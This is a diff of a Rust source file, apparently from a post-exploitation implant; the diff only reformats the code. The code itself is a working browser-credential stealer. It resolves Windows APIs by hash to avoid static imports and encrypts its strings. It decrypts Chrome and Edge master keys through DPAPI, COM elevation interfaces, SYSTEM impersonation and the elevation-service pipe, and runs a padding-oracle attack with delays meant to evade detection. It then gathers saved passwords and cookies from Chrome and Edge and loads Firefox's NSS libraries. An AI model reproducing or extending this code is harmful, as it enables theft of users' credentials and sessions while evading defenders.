@@ -45,7 +45,11 @@ type FnCryptUnprotectData = unsafe extern "system" fn(
 ) -> i32;
 
 type FnCoCreateInstance = unsafe extern "system" fn(
-    *const GUID, *mut c_void, DWORD, *const GUID, *mut *mut c_void,
+    *const GUID,
+    *mut c_void,
+    DWORD,
+    *const GUID,
+    *mut *mut c_void,
 ) -> i32;
 
 type FnCoInitializeEx = unsafe extern "system" fn(*mut c_void, DWORD) -> i32;
@@ -59,14 +63,18 @@ type FnFreeLibrary = unsafe extern "system" fn(HMODULE) -> i32;
 type FnGetProcAddress = unsafe extern "system" fn(HMODULE, *const i8) -> *mut c_void;
 type FnWaitNamedPipeW = unsafe extern "system" fn(*const u16, DWORD) -> i32;
 type FnCreateFileW = unsafe extern "system" fn(
-    *const u16, DWORD, DWORD, *mut c_void, DWORD, DWORD, *mut c_void,
+    *const u16,
+    DWORD,
+    DWORD,
+    *mut c_void,
+    DWORD,
+    DWORD,
+    *mut c_void,
 ) -> HANDLE;
-type FnWriteFile = unsafe extern "system" fn(
-    HANDLE, *const c_void, DWORD, *mut DWORD, *mut c_void,
-) -> i32;
-type FnReadFile = unsafe extern "system" fn(
-    HANDLE, *mut c_void, DWORD, *mut DWORD, *mut c_void,
-) -> i32;
+type FnWriteFile =
+    unsafe extern "system" fn(HANDLE, *const c_void, DWORD, *mut DWORD, *mut c_void) -> i32;
+type FnReadFile =
+    unsafe extern "system" fn(HANDLE, *mut c_void, DWORD, *mut DWORD, *mut c_void) -> i32;
 
 #[inline(always)]
 unsafe fn fn_ptr_from_addr<T: Copy>(addr: usize) -> T {
@@ -90,11 +98,7 @@ unsafe fn resolve_api<T: Copy>(dll_hash: u32, fn_hash: u32) -> Option<T> {
 /// First tries PEB lookup; if that fails, loads the DLL via kernel32's
 /// LoadLibraryW, then resolves the function.
 #[inline(always)]
-unsafe fn resolve_api_or_load<T>(
-    dll_wide: &[u16],
-    dll_hash: u32,
-    fn_hash: u32,
-) -> Option<T>
+unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Option<T>
 where
     T: Copy,
 {
@@ -107,10 +111,8 @@ where
     // DLL not loaded yet — use LoadLibraryW from kernel32.
     let load_library_w: FnLoadLibraryW = {
         let base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
-        let addr = pe_resolve::get_proc_address_by_hash(
-            base,
-            pe_resolve::hash_str(b"LoadLibraryW\0"),
-        )?;
+        let addr =
+            pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
         std::mem::transmute::<_, FnLoadLibraryW>(addr)
     };
     let _hmod = load_library_w(dll_wide.as_ptr());
@@ -126,8 +128,16 @@ where
 // from advapi32.dll by hash, with advapi32.dll itself loaded by hash from the
 // PEB (no static import).
 
-type FnRegOpenKeyExW = unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *mut *mut c_void) -> i32;
-type FnRegQueryValueExW = unsafe extern "system" fn(*mut c_void, *const u16, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
+type FnRegOpenKeyExW =
+    unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *mut *mut c_void) -> i32;
+type FnRegQueryValueExW = unsafe extern "system" fn(
+    *mut c_void,
+    *const u16,
+    *mut u32,
+    *mut u32,
+    *mut u8,
+    *mut u32,
+) -> i32;
 type FnRegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
 
 /// Resolve advapi32.dll base by hashing its name at runtime.
@@ -158,11 +168,20 @@ unsafe fn reg_open_key_ex(hkey: *mut c_void, subkey: &[u16], access: u32) -> Opt
 /// Reads a `REG_SZ` value and returns it as a String.
 unsafe fn reg_query_string_value(hkey: *mut c_void, name: &[u16]) -> Option<String> {
     let base = advapi32_base()?;
-    let f: FnRegQueryValueExW = resolve_api_from_base(base, pe_resolve::hash_str(b"RegQueryValueExW\0"))?;
+    let f: FnRegQueryValueExW =
+        resolve_api_from_base(base, pe_resolve::hash_str(b"RegQueryValueExW\0"))?;
 
     let mut buf_len: u32 = 0;
     // First call: query size.
-    if f(hkey, name.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), &mut buf_len) != 0 {
+    if f(
+        hkey,
+        name.as_ptr(),
+        ptr::null_mut(),
+        ptr::null_mut(),
+        ptr::null_mut(),
+        &mut buf_len,
+    ) != 0
+    {
         return None;
     }
     if buf_len == 0 {
@@ -170,7 +189,15 @@ unsafe fn reg_query_string_value(hkey: *mut c_void, name: &[u16]) -> Option<Stri
     }
     let mut buf = vec![0u8; buf_len as usize];
     let mut data_type: u32 = 0;
-    if f(hkey, name.as_ptr(), ptr::null_mut(), &mut data_type, buf.as_mut_ptr(), &mut buf_len) != 0 {
+    if f(
+        hkey,
+        name.as_ptr(),
+        ptr::null_mut(),
+        &mut data_type,
+        buf.as_mut_ptr(),
+        &mut buf_len,
+    ) != 0
+    {
         return None;
     }
     // Only handle REG_SZ (1) and REG_EXPAND_SZ (2).
@@ -178,8 +205,15 @@ unsafe fn reg_query_string_value(hkey: *mut c_void, name: &[u16]) -> Option<Stri
         return None;
     }
     // Trim trailing nulls and convert UTF-16 to String.
-    let u16_slice: Vec<u16> = buf.chunks(2)
-        .filter_map(|c| if c.len() == 2 { Some(u16::from_le_bytes([c[0], c[1]])) } else { None })
+    let u16_slice: Vec<u16> = buf
+        .chunks(2)
+        .filter_map(|c| {
+            if c.len() == 2 {
+                Some(u16::from_le_bytes([c[0], c[1]]))
+            } else {
+                None
+            }
+        })
         .take_while(|&c| c != 0)
         .collect();
     String::from_utf16(&u16_slice).ok()
@@ -188,7 +222,9 @@ unsafe fn reg_query_string_value(hkey: *mut c_void, name: &[u16]) -> Option<Stri
 /// Close a registry key via pe_resolve'd RegCloseKey.
 unsafe fn reg_close_key(hkey: *mut c_void) {
     if let Some(base) = advapi32_base() {
-        if let Some(f) = resolve_api_from_base::<FnRegCloseKey>(base, pe_resolve::hash_str(b"RegCloseKey\0")) {
+        if let Some(f) =
+            resolve_api_from_base::<FnRegCloseKey>(base, pe_resolve::hash_str(b"RegCloseKey\0"))
+        {
             f(hkey);
         }
     }
@@ -477,8 +513,7 @@ fn collect_rows_from_page(
             if hdr_off + 5 >= page.len() {
                 return;
             }
-            let cell_count =
-                u16::from_be_bytes([page[hdr_off + 3], page[hdr_off + 4]]) as usize;
+            let cell_count = u16::from_be_bytes([page[hdr_off + 3], page[hdr_off + 4]]) as usize;
             // Cell pointer array begins immediately after the 8-byte leaf page header.
             let cell_ptrs_start = hdr_off + 8;
 
@@ -487,8 +522,7 @@ fn collect_rows_from_page(
                 if ptr_off + 2 > page.len() {
                     break;
                 }
-                let cell_off =
-                    u16::from_be_bytes([page[ptr_off], page[ptr_off + 1]]) as usize;
+                let cell_off = u16::from_be_bytes([page[ptr_off], page[ptr_off + 1]]) as usize;
                 if cell_off >= page.len() {
                     continue;
                 }
@@ -513,8 +547,7 @@ fn collect_rows_from_page(
             if hdr_off + 12 > page.len() {
                 return;
             }
-            let cell_count =
-                u16::from_be_bytes([page[hdr_off + 3], page[hdr_off + 4]]) as usize;
+            let cell_count = u16::from_be_bytes([page[hdr_off + 3], page[hdr_off + 4]]) as usize;
             // Right-most child pointer is bytes 8-11 of the interior page header.
             let right_most = u32::from_be_bytes([
                 page[hdr_off + 8],
@@ -531,8 +564,7 @@ fn collect_rows_from_page(
                 if ptr_off + 2 > page.len() {
                     break;
                 }
-                let cell_off =
-                    u16::from_be_bytes([page[ptr_off], page[ptr_off + 1]]) as usize;
+                let cell_off = u16::from_be_bytes([page[ptr_off], page[ptr_off + 1]]) as usize;
                 if cell_off + 4 > page.len() {
                     continue;
                 }
@@ -596,7 +628,11 @@ fn sqlite_read_table(db: &[u8], table_name: &str) -> Result<Vec<Vec<SqliteValue>
     }
 
     let raw_page_size = u16::from_be_bytes([db[16], db[17]]) as usize;
-    let page_size = if raw_page_size == 1 { 65536 } else { raw_page_size };
+    let page_size = if raw_page_size == 1 {
+        65536
+    } else {
+        raw_page_size
+    };
     if page_size < 512 {
         bail!("SQLite: implausible page size {}", page_size);
     }
@@ -642,14 +678,17 @@ fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>> {
         bail!("CryptUnprotectData failed");
     }
 
-    let decrypted = unsafe {
-        std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize).to_vec()
-    };
+    let decrypted =
+        unsafe { std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize).to_vec() };
 
     // Free via dynamically resolved LocalFree.
     let local_free: FnLocalFree = unsafe {
-        resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"LocalFree\0"))
-    }.ok_or_else(|| anyhow!("LocalFree resolve failed"))?;
+        resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            pe_resolve::hash_str(b"LocalFree\0"),
+        )
+    }
+    .ok_or_else(|| anyhow!("LocalFree resolve failed"))?;
     unsafe { local_free(out_blob.pbData as *mut _) };
     Ok(decrypted)
 }
@@ -668,8 +707,7 @@ fn decrypt_chromium_value(master_key: &common::SecureKey, data: &[u8]) -> Result
 
     if prefix == b"v20" {
         // v20: DPAPI wraps the AES-GCM blob.
-        let inner = dpapi_decrypt(&data[3..])
-            .context("v20 DPAPI unwrap failed")?;
+        let inner = dpapi_decrypt(&data[3..]).context("v20 DPAPI unwrap failed")?;
         // inner should now start with v10
         if inner.len() < 3 || &inner[..3] != b"v10" {
             bail!("v20 DPAPI payload did not start with v10");
@@ -713,8 +751,8 @@ fn aes256gcm_decrypt(key: &[u8], ciphertext_with_prefix: &[u8]) -> Result<Vec<u8
 fn read_encrypted_key_from_local_state(local_state_path: &Path) -> Result<Vec<u8>> {
     let raw = fs::read(local_state_path)
         .with_context(|| format!("reading Local State: {}", local_state_path.display()))?;
-    let json: serde_json::Value = serde_json::from_slice(&raw)
-        .context("parsing Local State JSON")?;
+    let json: serde_json::Value =
+        serde_json::from_slice(&raw).context("parsing Local State JSON")?;
 
     let b64 = json
         .get("os_crypt")
@@ -745,18 +783,43 @@ fn decrypt_master_key_legacy(encrypted_key: &[u8]) -> Result<Vec<u8>> {
 /// Each channel has its own CLSID registered under HKLM.
 const CHROME_ELEVATION_CLSIDS: &[GUID] = &[
     // Chrome Stable
-    GUID { Data1: 0x708860E0, Data2: 0xF641, Data3: 0x4611, Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B] },
+    GUID {
+        Data1: 0x708860E0,
+        Data2: 0xF641,
+        Data3: 0x4611,
+        Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
+    },
     // Chrome Beta
-    GUID { Data1: 0xDD3B4FCB, Data2: 0x56DF, Data3: 0x41CA, Data4: [0xB7, 0x3A, 0x39, 0xDE, 0xED, 0x68, 0x0B, 0x90] },
+    GUID {
+        Data1: 0xDD3B4FCB,
+        Data2: 0x56DF,
+        Data3: 0x41CA,
+        Data4: [0xB7, 0x3A, 0x39, 0xDE, 0xED, 0x68, 0x0B, 0x90],
+    },
     // Chrome Canary
-    GUID { Data1: 0x7A788E5A, Data2: 0x0F1D, Data3: 0x4CF9, Data4: [0xA1, 0xB1, 0xC3, 0x52, 0x18, 0xD1, 0xE6, 0x8D] },
+    GUID {
+        Data1: 0x7A788E5A,
+        Data2: 0x0F1D,
+        Data3: 0x4CF9,
+        Data4: [0xA1, 0xB1, 0xC3, 0x52, 0x18, 0xD1, 0xE6, 0x8D],
+    },
     // Chrome Dev
-    GUID { Data1: 0xBB88A6E2, Data2: 0xC90A, Data3: 0x4FEC, Data4: [0x8C, 0x48, 0x85, 0x80, 0xBB, 0x3D, 0xE2, 0xA1] },
+    GUID {
+        Data1: 0xBB88A6E2,
+        Data2: 0xC90A,
+        Data3: 0x4FEC,
+        Data4: [0x8C, 0x48, 0x85, 0x80, 0xBB, 0x3D, 0xE2, 0xA1],
+    },
 ];
 
 const EDGE_ELEVATION_CLSIDS: &[GUID] = &[
     // Edge Stable
-    GUID { Data1: 0x1ECFDAFB, Data2: 0x9B0A, Data3: 0x4D64, Data4: [0xB5, 0x2A, 0x30, 0xE0, 0x40, 0x04, 0x1B, 0x93] },
+    GUID {
+        Data1: 0x1ECFDAFB,
+        Data2: 0x9B0A,
+        Data3: 0x4D64,
+        Data4: [0xB5, 0x2A, 0x30, 0xE0, 0x40, 0x04, 0x1B, 0x93],
+    },
 ];
 
 /// IID of the IElevator COM interface.
@@ -773,11 +836,7 @@ const DECRYPT_DATA_VTABLE_SLOTS: &[usize] = &[5, 9, 12];
 
 /// Try to call `IElevator::DecryptData` via COM for the given CLSID and return
 /// the decrypted bytes on success.
-unsafe fn com_try_decrypt(
-    clsid: &GUID,
-    iid: &GUID,
-    data: &[u8],
-) -> Result<Vec<u8>> {
+unsafe fn com_try_decrypt(clsid: &GUID, iid: &GUID, data: &[u8]) -> Result<Vec<u8>> {
     // Resolve ole32.dll functions (may not be in PEB — load if needed).
     let ole32_wide: Vec<u16> = "ole32.dll\0".encode_utf16().collect();
     let ole32_hash = pe_resolve::hash_wstr(&ole32_wide[..ole32_wide.len() - 1]);
@@ -785,7 +844,8 @@ unsafe fn com_try_decrypt(
         &ole32_wide,
         ole32_hash,
         pe_resolve::hash_str(b"CoCreateInstance\0"),
-    ).ok_or_else(|| anyhow!("CoCreateInstance resolve failed"))?;
+    )
+    .ok_or_else(|| anyhow!("CoCreateInstance resolve failed"))?;
 
     // Resolve oleaut32.dll functions.
     let oleaut32_wide: Vec<u16> = "oleaut32.dll\0".encode_utf16().collect();
@@ -794,12 +854,14 @@ unsafe fn com_try_decrypt(
         &oleaut32_wide,
         oleaut32_hash,
         pe_resolve::hash_str(b"SysAllocStringByteLen\0"),
-    ).ok_or_else(|| anyhow!("SysAllocStringByteLen resolve failed"))?;
+    )
+    .ok_or_else(|| anyhow!("SysAllocStringByteLen resolve failed"))?;
     let sys_free: FnSysFreeString = resolve_api_or_load(
         &oleaut32_wide,
         oleaut32_hash,
         pe_resolve::hash_str(b"SysFreeString\0"),
-    ).ok_or_else(|| anyhow!("SysFreeString resolve failed"))?;
+    )
+    .ok_or_else(|| anyhow!("SysFreeString resolve failed"))?;
 
     let mut punk: *mut c_void = ptr::null_mut();
     let hr = co_create(
@@ -817,7 +879,9 @@ unsafe fn com_try_decrypt(
     struct ComRelease(*mut c_void);
     impl Drop for ComRelease {
         fn drop(&mut self) {
-            if self.0.is_null() { return; }
+            if self.0.is_null() {
+                return;
+            }
             unsafe {
                 let vtable = *(self.0 as *const *const *const usize);
                 // vtable[2] = Release
@@ -841,9 +905,9 @@ unsafe fn com_try_decrypt(
         // Signature: HRESULT DecryptData(BSTR ciphertext, BSTR* plaintext, DWORD* last_error)
         type DecryptFn = unsafe extern "system" fn(
             this: *mut c_void,
-            ciphertext: *mut u16,      // BSTR (in)
-            plaintext: *mut *mut u16,  // BSTR* (out)
-            last_error: *mut u32,      // DWORD* (out)
+            ciphertext: *mut u16,     // BSTR (in)
+            plaintext: *mut *mut u16, // BSTR* (out)
+            last_error: *mut u32,     // DWORD* (out)
         ) -> i32;
 
         let fn_ptr = *(*vtable).add(slot);
@@ -890,17 +954,21 @@ fn decrypt_master_key_via_com(encrypted_key: &[u8], clsids: &[GUID]) -> Result<V
             ole32_hash,
             pe_resolve::hash_str(b"CoInitializeEx\0"),
         )
-    }.ok_or_else(|| anyhow!("CoInitializeEx resolve failed"))?;
+    }
+    .ok_or_else(|| anyhow!("CoInitializeEx resolve failed"))?;
     let co_uninit: FnCoUninitialize = unsafe {
         resolve_api_or_load(
             &ole32_wide,
             ole32_hash,
             pe_resolve::hash_str(b"CoUninitialize\0"),
         )
-    }.ok_or_else(|| anyhow!("CoUninitialize resolve failed"))?;
+    }
+    .ok_or_else(|| anyhow!("CoUninitialize resolve failed"))?;
 
     // CoInitializeEx for the calling thread; tolerate S_FALSE (already initialized).
-    let hr_init = unsafe { co_init(ptr::null_mut(), 0x2 /* COINIT_APARTMENTTHREADED */) };
+    let hr_init = unsafe {
+        co_init(ptr::null_mut(), 0x2 /* COINIT_APARTMENTTHREADED */)
+    };
     let did_coinit = hr_init == 0;
 
     let mut last_err: Option<anyhow::Error> = None;
@@ -925,8 +993,7 @@ fn decrypt_master_key_via_com(encrypted_key: &[u8], clsids: &[GUID]) -> Result<V
 /// Strategy B: impersonate SYSTEM, then run DPAPI (the App-Bound key was
 /// encrypted with the SYSTEM user-DPAPI context by the elevation service).
 fn decrypt_master_key_via_system_token(encrypted_key: &[u8]) -> Result<Vec<u8>> {
-    crate::token_manipulation::get_system()
-        .context("GetSystem for App-Bound key decryption")?;
+    crate::token_manipulation::get_system().context("GetSystem for App-Bound key decryption")?;
 
     let result = dpapi_decrypt(encrypted_key);
 
@@ -944,21 +1011,37 @@ fn decrypt_master_key_via_system_token(encrypted_key: &[u8]) -> Result<Vec<u8>> 
 fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
     // Resolve kernel32 functions for pipe IPC.
     let wait_named_pipe: FnWaitNamedPipeW = unsafe {
-        resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"WaitNamedPipeW\0"))
-    }.ok_or_else(|| anyhow!("WaitNamedPipeW resolve failed"))?;
+        resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            pe_resolve::hash_str(b"WaitNamedPipeW\0"),
+        )
+    }
+    .ok_or_else(|| anyhow!("WaitNamedPipeW resolve failed"))?;
     let create_file: FnCreateFileW = unsafe {
-        resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"CreateFileW\0"))
-    }.ok_or_else(|| anyhow!("CreateFileW resolve failed"))?;
+        resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            pe_resolve::hash_str(b"CreateFileW\0"),
+        )
+    }
+    .ok_or_else(|| anyhow!("CreateFileW resolve failed"))?;
     let write_file: FnWriteFile = unsafe {
-        resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"WriteFile\0"))
-    }.ok_or_else(|| anyhow!("WriteFile resolve failed"))?;
+        resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            pe_resolve::hash_str(b"WriteFile\0"),
+        )
+    }
+    .ok_or_else(|| anyhow!("WriteFile resolve failed"))?;
     let read_file: FnReadFile = unsafe {
-        resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"ReadFile\0"))
-    }.ok_or_else(|| anyhow!("ReadFile resolve failed"))?;
+        resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            pe_resolve::hash_str(b"ReadFile\0"),
+        )
+    }
+    .ok_or_else(|| anyhow!("ReadFile resolve failed"))?;
 
-    let pipe_wide: Vec<u16> = String::from_utf8_lossy(
-        &string_crypt::enc_str!("\\\\.\\pipe\\ChromeElevationService\0"),
-    )
+    let pipe_wide: Vec<u16> = String::from_utf8_lossy(&string_crypt::enc_str!(
+        "\\\\.\\pipe\\ChromeElevationService\0"
+    ))
     .trim_end_matches('\0')
     .encode_utf16()
     .chain(std::iter::once(0))
@@ -1008,7 +1091,13 @@ fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
 
     let mut written: u32 = 0;
     let ok = unsafe {
-        write_file(pipe, frame.as_ptr() as *const c_void, frame.len() as u32, &mut written, ptr::null_mut())
+        write_file(
+            pipe,
+            frame.as_ptr() as *const c_void,
+            frame.len() as u32,
+            &mut written,
+            ptr::null_mut(),
+        )
     };
     if ok == 0 {
         bail!("WriteFile to elevation service pipe failed");
@@ -1018,19 +1107,34 @@ fn decrypt_master_key_via_pipe(encrypted_key: &[u8]) -> Result<Vec<u8>> {
     let mut len_buf = [0u8; 4];
     let mut read: u32 = 0;
     let ok = unsafe {
-        read_file(pipe, len_buf.as_mut_ptr() as *mut c_void, 4, &mut read, ptr::null_mut())
+        read_file(
+            pipe,
+            len_buf.as_mut_ptr() as *mut c_void,
+            4,
+            &mut read,
+            ptr::null_mut(),
+        )
     };
     if ok == 0 || read != 4 {
         bail!("ReadFile (length prefix) from elevation service pipe failed");
     }
     let response_len = u32::from_le_bytes(len_buf) as usize;
     if response_len == 0 || response_len > 4096 {
-        bail!("implausible response length {} from elevation service pipe", response_len);
+        bail!(
+            "implausible response length {} from elevation service pipe",
+            response_len
+        );
     }
 
     let mut response = vec![0u8; response_len];
     let ok = unsafe {
-        read_file(pipe, response.as_mut_ptr() as *mut c_void, response_len as u32, &mut read, ptr::null_mut())
+        read_file(
+            pipe,
+            response.as_mut_ptr() as *mut c_void,
+            response_len as u32,
+            &mut read,
+            ptr::null_mut(),
+        )
     };
     if ok == 0 || read as usize != response_len {
         bail!("ReadFile (payload) from elevation service pipe failed");
@@ -1124,7 +1228,8 @@ impl C4CancelToken {
         }
     }
     fn cancel(&self) {
-        self.cancelled.store(true, std::sync::atomic::Ordering::Relaxed);
+        self.cancelled
+            .store(true, std::sync::atomic::Ordering::Relaxed);
     }
     fn is_cancelled(&self) -> bool {
         self.cancelled.load(std::sync::atomic::Ordering::Relaxed)
@@ -1158,19 +1263,20 @@ pub fn set_c4_timeout(secs: u64) {
 
 /// Resolve `CryptUnprotectData` via pe_resolve (no compile-time link to crypt32.lib).
 /// Returns the function pointer on success.
-unsafe fn resolve_crypt_unprotect_data()
-    -> Option<unsafe extern "system" fn(
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,   // pDataIn
-        *mut *mut u16,                                    // ppszDataDescr
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,   // pOptionalEntropy
-        *mut c_void,                                      // pvReserved
-        *mut c_void,                                      // pPromptStruct
-        u32,                                              // dwFlags
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,   // pDataOut
-    ) -> i32>
-{
+unsafe fn resolve_crypt_unprotect_data() -> Option<
+    unsafe extern "system" fn(
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB, // pDataIn
+        *mut *mut u16,                                 // ppszDataDescr
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB, // pOptionalEntropy
+        *mut c_void,                                   // pvReserved
+        *mut c_void,                                   // pPromptStruct
+        u32,                                           // dwFlags
+        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB, // pDataOut
+    ) -> i32,
+> {
     let dll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_CRYPT32_DLL)?;
-    let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, pe_resolve::HASH_CRYPTUNPROTECTDATA)?;
+    let fn_addr =
+        pe_resolve::get_proc_address_by_hash(dll_base, pe_resolve::HASH_CRYPTUNPROTECTDATA)?;
     Some(std::mem::transmute(fn_addr))
 }
 
@@ -1300,10 +1406,7 @@ fn parse_dpapi_blob(blob: &[u8]) -> Result<DpapiBlobInfo> {
         && offset_crypt + cb_crypt <= blob.len()
     {
         (offset_crypt, cb_crypt)
-    } else if cb_data > 0
-        && cb_data % 16 == 0
-        && offset_data + cb_data <= blob.len()
-    {
+    } else if cb_data > 0 && cb_data % 16 == 0 && offset_data + cb_data <= blob.len() {
         (offset_data, cb_data)
     } else {
         // Last resort: everything after the HMAC area up to the end,
@@ -1329,10 +1432,8 @@ fn parse_dpapi_blob(blob: &[u8]) -> Result<DpapiBlobInfo> {
         } else {
             bail!(
                 "{}",
-                String::from_utf8_lossy(&string_crypt::enc_str!(
-                    "DPAPI blob structure unexpected"
-                ))
-                .trim_end_matches('\0')
+                String::from_utf8_lossy(&string_crypt::enc_str!("DPAPI blob structure unexpected"))
+                    .trim_end_matches('\0')
             );
         }
     };
@@ -1412,10 +1513,8 @@ fn cbc_padding_oracle(
         if start.elapsed() > timeout {
             bail!(
                 "{}",
-                String::from_utf8_lossy(&string_crypt::enc_str!(
-                    "C4 attack timed out"
-                ))
-                .trim_end_matches('\0')
+                String::from_utf8_lossy(&string_crypt::enc_str!("C4 attack timed out"))
+                    .trim_end_matches('\0')
             );
         }
 
@@ -1460,10 +1559,8 @@ fn cbc_padding_oracle(
                 if start.elapsed() > timeout {
                     bail!(
                         "{}",
-                        String::from_utf8_lossy(&string_crypt::enc_str!(
-                            "C4 attack timed out"
-                        ))
-                        .trim_end_matches('\0')
+                        String::from_utf8_lossy(&string_crypt::enc_str!("C4 attack timed out"))
+                            .trim_end_matches('\0')
                     );
                 }
 
@@ -1473,7 +1570,8 @@ fn cbc_padding_oracle(
                 // preceding block with modified_prev.
                 let mut modified_blob = blob.to_vec();
                 let prev_block_start = (block_idx - 1) * block_size;
-                modified_blob[enc_offset + prev_block_start..enc_offset + prev_block_start + block_size]
+                modified_blob
+                    [enc_offset + prev_block_start..enc_offset + prev_block_start + block_size]
                     .copy_from_slice(&modified_prev);
 
                 // Call the oracle.
@@ -1508,7 +1606,8 @@ fn cbc_padding_oracle(
                     // Use a simple variable delay (1-10 ms) to avoid
                     // timing-based detection.
                     let delay_us = {
-                        let s = oracle_calls.wrapping_mul(6364136223846793005)
+                        let s = oracle_calls
+                            .wrapping_mul(6364136223846793005)
                             .wrapping_add(1442695040888963407);
                         1000 + (s >> 56) as u64 % 9000 // 1-10 ms
                     };
@@ -1842,19 +1941,14 @@ fn collect_chromium_cookies(
 }
 
 /// Entry point for Chrome data collection.
-pub fn collect_chrome_data(
-    data_type: &common::BrowserDataType,
-) -> BrowserDataResult {
+pub fn collect_chrome_data(data_type: &common::BrowserDataType) -> BrowserDataResult {
     let mut result = BrowserDataResult::default();
     let lad = match local_app_data() {
         Some(p) => p,
         None => return result,
     };
 
-    let user_data_dir = lad
-        .join("Google")
-        .join("Chrome")
-        .join("User Data");
+    let user_data_dir = lad.join("Google").join("Chrome").join("User Data");
     if !user_data_dir.is_dir() {
         return result;
     }
@@ -1866,15 +1960,23 @@ pub fn collect_chrome_data(
     };
 
     for profile in find_chromium_profiles(&user_data_dir) {
-        if matches!(data_type, common::BrowserDataType::Credentials | common::BrowserDataType::All) {
-            result.credentials.extend(
-                collect_chromium_credentials(&profile, &master_key, "Chrome"),
-            );
+        if matches!(
+            data_type,
+            common::BrowserDataType::Credentials | common::BrowserDataType::All
+        ) {
+            result.credentials.extend(collect_chromium_credentials(
+                &profile,
+                &master_key,
+                "Chrome",
+            ));
         }
-        if matches!(data_type, common::BrowserDataType::Cookies | common::BrowserDataType::All) {
-            result.cookies.extend(
-                collect_chromium_cookies(&profile, &master_key, "Chrome"),
-            );
+        if matches!(
+            data_type,
+            common::BrowserDataType::Cookies | common::BrowserDataType::All
+        ) {
+            result
+                .cookies
+                .extend(collect_chromium_cookies(&profile, &master_key, "Chrome"));
         }
     }
     result
@@ -1888,10 +1990,7 @@ pub fn collect_edge_data(data_type: &common::BrowserDataType) -> BrowserDataResu
         None => return result,
     };
 
-    let user_data_dir = lad
-        .join("Microsoft")
-        .join("Edge")
-        .join("User Data");
+    let user_data_dir = lad.join("Microsoft").join("Edge").join("User Data");
     if !user_data_dir.is_dir() {
         return result;
     }
@@ -1903,15 +2002,21 @@ pub fn collect_edge_data(data_type: &common::BrowserDataType) -> BrowserDataResu
     };
 
     for profile in find_chromium_profiles(&user_data_dir) {
-        if matches!(data_type, common::BrowserDataType::Credentials | common::BrowserDataType::All) {
-            result.credentials.extend(
-                collect_chromium_credentials(&profile, &master_key, "Edge"),
-            );
+        if matches!(
+            data_type,
+            common::BrowserDataType::Credentials | common::BrowserDataType::All
+        ) {
+            result
+                .credentials
+                .extend(collect_chromium_credentials(&profile, &master_key, "Edge"));
         }
-        if matches!(data_type, common::BrowserDataType::Cookies | common::BrowserDataType::All) {
-            result.cookies.extend(
-                collect_chromium_cookies(&profile, &master_key, "Edge"),
-            );
+        if matches!(
+            data_type,
+            common::BrowserDataType::Cookies | common::BrowserDataType::All
+        ) {
+            result
+                .cookies
+                .extend(collect_chromium_cookies(&profile, &master_key, "Edge"));
         }
     }
     result
@@ -1936,7 +2041,11 @@ impl SecItem {
         }
     }
     fn zeroed() -> Self {
-        SecItem { item_type: 0, data: ptr::null_mut(), len: 0 }
+        SecItem {
+            item_type: 0,
+            data: ptr::null_mut(),
+            len: 0,
+        }
     }
 }
 
@@ -1962,7 +2071,8 @@ fn find_firefox_install_dir() -> Option<PathBuf> {
     // All registry access uses pe_resolve'd RegOpenKeyExW / RegQueryValueExW / RegCloseKey.
     unsafe {
         let ff_key_wide: Vec<u16> = "SOFTWARE\\Mozilla\\Mozilla Firefox\0"
-            .encode_utf16().collect();
+            .encode_utf16()
+            .collect();
         let hklm_ff = reg_open_key_ex(HKEY_LOCAL_MACHINE, &ff_key_wide, KEY_READ)?;
 
         let curver_wide: Vec<u16> = "CurrentVersion\0".encode_utf16().collect();
@@ -2007,23 +2117,26 @@ unsafe fn load_nss(install_dir: &Path) -> Result<(HMODULE, HMODULE, NssFunctions
     let load_library_a: FnLoadLibraryA = resolve_api(
         pe_resolve::HASH_KERNEL32_DLL,
         pe_resolve::hash_str(b"LoadLibraryA\0"),
-    ).ok_or_else(|| anyhow!("LoadLibraryA resolve failed"))?;
+    )
+    .ok_or_else(|| anyhow!("LoadLibraryA resolve failed"))?;
     let free_library: FnFreeLibrary = resolve_api(
         pe_resolve::HASH_KERNEL32_DLL,
         pe_resolve::hash_str(b"FreeLibrary\0"),
-    ).ok_or_else(|| anyhow!("FreeLibrary resolve failed"))?;
+    )
+    .ok_or_else(|| anyhow!("FreeLibrary resolve failed"))?;
     let get_proc_address: FnGetProcAddress = resolve_api(
         pe_resolve::HASH_KERNEL32_DLL,
         pe_resolve::hash_str(b"GetProcAddress\0"),
-    ).ok_or_else(|| anyhow!("GetProcAddress resolve failed"))?;
